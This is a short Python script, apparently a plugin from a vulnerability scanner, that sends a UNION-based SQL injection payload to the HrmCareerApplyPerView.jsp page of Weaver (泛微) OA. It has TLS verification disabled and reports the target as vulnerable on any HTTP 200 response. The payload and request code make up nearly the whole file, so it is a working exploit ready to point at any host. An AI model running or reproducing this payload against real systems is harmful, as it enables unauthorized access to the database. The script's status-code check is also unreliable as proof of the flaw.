import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3
import sys

urllib3.disable_warnings()

def 泛微OA_hrmcareerApply_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target_url = urldata + "pweb/careerapply/HrmCareerApplyPerView.jsp?id=1 union select 1,2,sys.fn_sqlvarbasetostr(HashBytes('MD5','abc')),db_name(1),5,6,7"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            print(Vcolors.RED + "[!] 存在HrmCareerApplyPerView的sql注入漏洞\r" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在HrmCareerApplyPerView的sql注入漏洞" + Vcolors.ENDC)
    except:
        logging.error("泛微OA_hrmcareerApply_sql脚本出现异常")

        


